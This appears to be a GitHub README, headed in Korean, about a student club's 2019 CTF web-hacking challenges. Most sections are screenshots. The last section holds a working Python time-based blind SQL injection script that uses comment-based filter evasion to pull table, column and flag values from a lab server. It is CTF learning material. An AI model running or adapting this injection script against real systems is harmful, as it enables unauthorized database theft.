# 2019-self-web-hacking-challenge-document
**2019년 동아리에서 공부했던 해킹대회 문제환경 제작 기록**

---

# 1. Magic Hash PHP Trick
![image](https://user-images.githubusercontent.com/48134435/172830128-4bed9da5-9f81-48a3-97bc-3614e8c54d5f.png)
![image](https://user-images.githubusercontent.com/48134435/172830163-f2787ebd-f436-4e88-b7df-9bf15d6b8005.png)
![image](https://user-images.githubusercontent.com/48134435/172830174-60b7b881-98cb-4429-9fe1-ad39f40c4e96.png)
![image](https://user-images.githubusercontent.com/48134435/172830183-136750e1-6f8c-4efe-bf3d-dd0493ecd614.png)
![image](https://user-images.githubusercontent.com/48134435/172830197-4cd11050-d6e6-4165-996e-5dd2cc255d20.png)


# 2. Pentesting
![image](https://user-images.githubusercontent.com/48134435/172830286-a30c69c0-d79b-471c-ba9f-08c95a3b0c9e.png)
![image](https://user-images.githubusercontent.com/48134435/172830297-0c5a29c4-7d06-4cc2-b05f-aa307fed36c1.png)
![image](https://user-images.githubusercontent.com/48134435/172830472-18fca4c0-ef92-478f-bbe7-d5b6c266e112.png)
![image](https://user-images.githubusercontent.com/48134435/172830520-799887a2-4fe1-49a0-8a54-cd882288fc01.png)
![image](https://user-images.githubusercontent.com/48134435/172830538-fd626695-3a71-4b73-908c-7025969bb6a2.png)
![image](https://user-images.githubusercontent.com/48134435/172830549-b6249a6d-af06-47c5-9b73-be900a102bfb.png)


# 3. Django CSRF
![image](https://user-images.githubusercontent.com/48134435/172830722-425b8da8-d5c6-4d94-b394-429eeb4be3bc.png)
![image](https://user-images.githubusercontent.com/48134435/172830752-433b0919-ba73-459c-8abc-8d05359ccdbe.png)
![image](https://user-images.githubusercontent.com/48134435/172830761-5c799e20-4eb1-42f5-b70b-5bb94914aaef.png)
![image](https://user-images.githubusercontent.com/48134435/172830788-7cb0c7ae-f943-4ea9-ade9-b25c4b1be860.png)
![image](https://user-images.githubusercontent.com/48134435/172830797-fd8098da-68ad-49ee-938b-07b94f950a80.png)
![image](https://user-images.githubusercontent.com/48134435/172830813-48f2ef32-5c75-4669-b95a-75670bdf0daf.png)
![image](https://user-images.githubusercontent.com/48134435/172830841-d763e0a9-57b2-4fdc-92c6-222afa03a870.png)
![image](https://user-images.githubusercontent.com/48134435/172830861-e0ddc0e3-bf4b-4b24-b20c-147a7f5222bc.png)


# 4. XSS Auditor bypass
![image](https://user-images.githubusercontent.com/48134435/172830906-82857b73-5814-4e7d-b4ae-0c2106a961a2.png)
![image](https://user-images.githubusercontent.com/48134435/172830925-eb8faef9-48d8-4ac8-a5d9-dde4bc2d6b80.png)
![image](https://user-images.githubusercontent.com/48134435/172830937-ae8c469f-a9e4-493b-b527-ed6963984f5c.png)
![image](https://user-images.githubusercontent.com/48134435/172830943-4f7ba4c8-3702-4c34-a2dc-6803a837ee48.png)
![image](https://user-images.githubusercontent.com/48134435/172830955-f99a590f-e772-4469-b9aa-1219cd7d51e7.png)
![image](https://user-images.githubusercontent.com/48134435/172831063-da176e72-e654-477d-b3c0-8a4ce7175cdf.png)
![image](https://user-images.githubusercontent.com/48134435/172831109-7b0d4989-566d-4e19-8768-ec9f2deb6416.png)
![image](https://user-images.githubusercontent.com/48134435/172831151-ccbb04b2-648d-4caa-b127-c46603da6bfb.png)
![image](https://user-images.githubusercontent.com/48134435/172831254-aa0fe1e1-7ade-41e0-b807-6a011312c541.png)


# 5. Time-Based Blind SQL injection
![image](https://user-images.githubusercontent.com/48134435/172831499-af3b2c80-c115-452a-935c-d520f632be45.png)
![image](https://user-images.githubusercontent.com/48134435/172831521-f2ad2827-d0dd-4135-9111-c1a433c75714.png)
![image](https://user-images.githubusercontent.com/48134435/172831561-56eda639-92a7-418b-9fab-8ddaced391b8.png)
![image](https://user-images.githubusercontent.com/48134435/172831579-27030614-bd6c-43c5-bafd-0a29ce5bd4ce.png)
![image](https://user-images.githubusercontent.com/48134435/172831587-60b9081f-e343-4bf8-af8a-db0defabda95.png)
![image](https://user-images.githubusercontent.com/48134435/172831606-0925ce9c-ac13-42d8-980b-0e28385abde6.png)
![image](https://user-images.githubusercontent.com/48134435/172831620-5718c18a-3bce-4fc8-b7b2-d792feab4d24.png)
```
import requests
import time
 
url = "http://192.168.200.201/index.php?p=search_Lion"
 
print ("[+] Start")
print ("[+] Find Table Name")
 
found = ""
for j in range(1, 10):
    for i in range(48, 128):
        try:
            t1=time.time()
            data = "'union/**/select/**/substr(column_name,1,10)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/&&/**/if(substr(table_name,"+str(j)+",1)='"+chr(i)+"',sleep(4),1)/**/&&/**/1^'"
            r = requests.post(url, data={'query': data})
            t2=time.time()
        except:
            print ("[-] Error occur")
            continue
 
        if t2-t1>1:
            found += chr(i)
            print ("[+] Found " + str(j), ":", found)
            break
 
print ("[+] Found Table : ", found)
print ("[+] End\n\n")
 
 
 
print ("[+] Start")
print ("[+] Find col Name")
 
found = ""
 
for j in range(1, 10):
    for i in range(48, 128):
        try:
            t1=time.time()
            data = "'union/**/select/**/substr(column_name,1,10)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/&&/**/if(substr(column_name,"+str(j)+",1)='"+chr(i)+"',sleep(4),1)/**/&&/**/1^'"
            r = requests.post(url, data={'query': data})
            t2=time.time()
        except:
            print ("[-] Error occur")
            continue
 
        if t2-t1>1:
            found += chr(i)
            print ("[+] Found " + str(j), ":", found)
            break
 
print ("[+] Found Column : ", found)
print ("[+] End\n\n")
 
 
print ("[+] Start")
print ("[+] Find Flag")
 
found = ""
 
for j in range(1, 13):
    for i in range(48, 128):
        try:
            t1=time.time()
            """'|| n4me NOT IN ("AC3_BeD","bR0$MAN","CO@LpIs","DrA9&PROD","EyEligntening","Family_L!on") && if(substr(n4me,1,1)=binary("P"),sleep(1),1) && 1^'"""
            data = """'||/**/n4me/**/NOT/**/IN/**/("AC3_BeD","bR0$MAN","CO@LpIs","DrA9&PROD","EyEligntening","Family_L!on")/**/&&/**/if(substr(n4me,"""+str(j)+""",1)=binary('"""+chr(i)+"""'),sleep(3),1)/**/&&/**/1^'"""
            r = requests.post(url, data={'query': data})
            t2=time.time()
        except:
            print ("[-] Error occur")
            continue
 
        if t2-t1>1:
            found += chr(i)
            print ("[+] Found " + str(j), ":", found)
            break
 
print ("[+] Found Flag : ", found)
print ("[+] End")

```

![image](https://user-images.githubusercontent.com/48134435/172831640-27af619c-1c0c-4013-bd25-ed4b71e01d6d.png)
